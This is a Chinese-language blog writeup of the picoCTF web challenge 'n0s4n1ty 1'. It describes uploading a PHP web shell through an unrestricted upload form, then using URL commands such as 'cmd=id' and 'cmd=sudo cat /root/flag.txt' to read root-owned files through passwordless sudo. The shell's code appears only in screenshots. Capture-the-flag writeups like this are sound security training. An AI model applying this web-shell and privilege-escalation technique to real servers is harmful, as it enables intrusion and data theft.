---
title: n0s4n1ty 1
published: 2025-07-10
updated: 2025-07-10
description: "picoCTF"
image: ""
tags: ["CTF Writeup", "picoCTF", "Web"]
category: "picoCTF"
draft: false
---

# n0s4n1ty 1

一進到網站會發現可以上傳檔案，開`F12`還會發現上傳沒有限制檔案類型

![home](/assets/picoCTF/n0s4n1ty1/image.png)

先建立`shell.php`

![alt text](/assets/picoCTF/n0s4n1ty1/image-5.png)

(本來想直接貼上來的，但是 windows 會一直幫我刪掉，真是謝囉)

然後把 `shell.php` 上傳上去

![alt text](/assets/picoCTF/n0s4n1ty1/image-1.png)

進到 `/uploads/shell.php?cmd=ls /root` 之後會發現 /root 底下沒有顯示任何檔案

檢查一下 `/uploads/shell.php?cmd=id`

```txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

會發現使用者 `www-data` 可以不需要密碼以 sudo 執行任何指令（權限等於 root）

![alt text](/assets/picoCTF/n0s4n1ty1/image-2.png)

重新加上 sudo 檢查 `/root`

![alt text](/assets/picoCTF/n0s4n1ty1/image-3.png)

`/uploads/shell.php?cmd=sudo cat /root/flag.txt`

![alt text](/assets/picoCTF/n0s4n1ty1/image-4.png)
